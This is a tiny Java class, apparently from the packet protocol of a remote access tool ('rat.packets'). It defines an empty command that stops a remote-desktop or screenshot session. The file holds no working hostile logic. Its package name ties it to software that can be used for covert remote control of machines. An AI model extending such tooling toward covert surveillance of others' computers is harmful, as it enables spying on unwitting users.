package rat.packets;

import java.io.Serializable;

public class ScreenshotStopPacket implements IPacket, Serializable {

    private static final long serialVersionUID = -4642500394957440443L;

    @Override
    public void execute() {
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.REMOTE_DESKTOP_STOP;
    }
}
